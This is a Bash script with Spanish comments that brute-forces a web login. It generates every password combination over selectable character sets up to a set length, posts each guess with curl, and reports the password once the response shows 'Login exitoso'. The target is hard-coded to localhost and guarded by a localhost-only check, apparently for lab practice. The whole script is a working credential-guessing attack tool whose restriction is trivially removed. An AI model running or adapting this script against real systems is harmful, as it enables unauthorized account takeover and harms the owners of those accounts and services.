#!/usr/bin/env bash
set -o errexit
set -o nounset
set -o pipefail

# Configuración por defecto
USER_DEFAULT="Criss"

# Definir conjuntos de caracteres como arrays (cada elemento 1 caracter)
Alphabetlower=({a..z})
AlphabetUpper=({A..Z})
Digits=({0..9})
Specials=('!' '#' '$' '%' '&' '/' '(' ')' '=' '?' '¡' '¿' '+' '[' ']' ';' ':' ',' '.')

# Selección por defecto
OPC="${3:-digits}"        # "digits" por defecto si no se pasa
USUARIO="${1:-$USER_DEFAULT}"
MAX_LEN="${2:-4}"        # por defecto 4 (cuidado: crece exponencialmente)
TARGET="http://127.0.0.1:8000"
URL="$TARGET"

# Extraer host y validar localhost
host=$(echo "$TARGET" | sed -E 's#https?://([^/:]+).*#\1#')
if [[ "$host" != "127.0.0.1" && "$host" != "localhost" && "$host" != "::1" ]]; then
  echo "ERROR: solo localhost permitido. Host detectado: $host"
  exit 2
fi

# Validaciones básicas
if ! [[ "$MAX_LEN" =~ ^[0-9]+$ ]] || (( MAX_LEN < 1 )); then
  echo "ERROR: MAX_LEN debe ser un entero >= 1. Valor recibido: $MAX_LEN"
  exit 3
fi

# Construir conjunto de caracteres según OPC
case "$OPC" in
  digits)
    CHARSET=("${Digits[@]}")
    ;;
  lower)
    CHARSET=("${Alphabetlower[@]}")
    ;;
  upper)
    CHARSET=("${AlphabetUpper[@]}")
    ;;
  alnum)
    CHARSET=("${Alphabetlower[@]}" "${AlphabetUpper[@]}" "${Digits[@]}")
    ;;
  all)
    CHARSET=("${Alphabetlower[@]}" "${AlphabetUpper[@]}" "${Specials[@]}" "${Digits[@]}")
    ;;
  custom)
    # ejemplo: si quieres pasar un string custom como variable de entorno CUSTOM="abc123"
    if [[ -z "${CUSTOM:-}" ]]; then
      echo "ERROR: modo custom seleccionado pero la variable CUSTOM no está definida."
      exit 4
    fi
    # convertir cada caracter de CUSTOM en elemento del array
    CHARSET=()
    for ((i=0;i<${#CUSTOM};i++)); do
      CHARSET+=("${CUSTOM:i:1}")
    done
    ;;
  *)
    echo "Opción OPC desconocida: $OPC. Usa digits|lower|upper|alnum|all|custom"
    exit 5
    ;;
esac

# Warn si el space search es enorme
card=${#CHARSET[@]}
maxComb=0
# estimamos combinaciones con sum_{i=1..MAX_LEN} card^i = (card^(MAX+1)-card)/(card-1)
if (( card > 1 )); then
  # cuidado con overflow: si excede 1e7 mostramos advertencia
  approx=1
  for ((i=1;i<=MAX_LEN;i++)); do
    approx=$(( approx * card ))
    if (( approx > 10000000 )); then
      echo "ADVERTENCIA: espacio de búsqueda muy grande (más de 10M combinaciones). MAX_LEN=$MAX_LEN, charset size=$card"
      break
    fi
  done
fi

# Generador tipo "odómetro": para cada longitud L de 1..MAX_LEN
attempts=0
for L in $(seq 1 "$MAX_LEN"); do
  # indices iniciales (todos ceros) para longitud L
  indices=( )
  for ((i=0;i<L;i++)); do indices+=(0); done

  done_flag=false
  while true; do
    # construir contraseña según indices
    pass=""
    for ((i=0;i<L;i++)); do
      pass+="${CHARSET[indices[i]]}"
    done

    ((attempts++))
    echo "[$attempts] Probando contraseña: $pass"

    # enviar petición (ajusta los parámetros del form según tu endpoint real)
    RESPONSE=$(curl -s --data-urlencode "user=$USUARIO" --data-urlencode "password=$pass" "$URL")

    # verificar respuesta
    if echo "$RESPONSE" | grep -q "Login exitoso"; then
      echo "Contraseña encontrada: $pass"
      echo "Respuesta completa:"
      echo "$RESPONSE"
      exit 0
    fi

    # incrementar "odómetro"
    idx=$((L-1))
    while true; do
      indices[$idx]=$(( indices[$idx] + 1 ))
      if (( indices[$idx] < card )); then
        break
      else
        indices[$idx]=0
        if (( idx == 0 )); then
          done_flag=true
          break
        fi
        idx=$((idx-1))
      fi
    done

    $done_flag && break
  done
done

echo "No se encontró ninguna contraseña en el espacio probado (intentos: $attempts)."
exit 1